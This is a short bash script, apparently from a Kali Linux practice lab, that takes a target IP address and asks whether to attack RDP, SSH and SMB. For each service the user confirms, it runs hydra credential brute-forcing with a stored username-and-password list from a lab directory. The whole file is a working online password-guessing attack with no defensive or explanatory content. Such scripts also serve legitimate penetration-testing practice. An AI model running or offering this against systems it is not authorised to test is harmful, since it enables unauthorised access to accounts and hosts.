#!/usr/bin/bash

if [ $# -ne 1 ]; then
  echo "指定された引数は$#個です。"
  exit 1
fi

IP=$1

echo 'RDP jikkou?'
read input1
echo 'SSH jikkou?'
read input2
echo 'SMB jikkou?'
read input3


if [ -z $input1 ] ; then
  echo "Input yes or no."
  exit 1
elif [ $input1 = 'yes' ] || [ $input1 = 'YES' ] || [ $input1 = 'y' ] || [ $input1 = 'Y' ] ; then
  hydra -V -C /home/kali/Lab/passwords -t 1 $IP rdp
  hydra -S -O -V -C /home/kali/Lab/passwords -t 1 $IP rdp
fi

if [ -z $input2 ] ; then
  echo "Input yes or no."
  exit 1
elif [ $input2 = 'yes' ] || [ $input2 = 'YES' ] || [ $input2 = 'y' ] || [ $input2 = 'Y' ] ; then
  hydra -V -C /home/kali/Lab/passwords -t 1 $IP ssh
fi

if [ -z $input3 ] ; then
  echo "Input yes or no."
  exit 1
elif [ $input3 = 'yes' ] || [ $input3 = 'YES' ] || [ $input3 = 'y' ] || [ $input3 = 'Y' ] ; then
  hydra -V -C /home/kali/Lab/passwords -t 1 $IP smb
fi



